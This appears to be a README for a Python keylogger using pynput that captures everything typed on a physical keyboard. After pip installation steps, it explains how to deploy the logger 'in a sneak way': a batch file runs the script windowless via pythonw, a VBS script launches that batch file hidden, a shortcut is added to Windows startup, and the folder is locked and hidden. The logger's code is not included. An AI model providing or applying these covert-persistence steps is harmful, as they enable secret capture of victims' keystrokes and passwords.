
# Key Logger

A basic key logger which will captures all the detail typed by physical Keyboard
## Tech Stack

 Python 


## Installation

Open Terminal

```bash
python3 -m pip install --upgrade pip
```
Check the pip version
```bash
pip --version
```
If version is showing you're good to go.  


Necessary pip modules 

```bash
pip install pynput

```
Check whether modules are installed properly or not
```bash
pip show pynput

```
If the details are showing you've installed all the necessary modules
## Setup

To deploy this project in a sneak way follow the instructions

*Create a folder here say ```open_it``` and excute the below instructions in it*

### Create a bat file

Copy the below snippet and make changes as said

```bash
@echo off
pythonw.exe "C:\path\to\your\keylogger.py"

```
Save as ```logger.bat```

### Create a vbs script file

Copy the below snippet and make changes as said

```bash
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\path\to\your\keylogger.bat", 0, False

```
Save as ```logger.vbs```

### Add it to Startup apps 

Press ```WIN + R```

Create a shortcut file for ```logger.vbs```

### Final Step 

Lock and Hide the ```open_it``` folder.
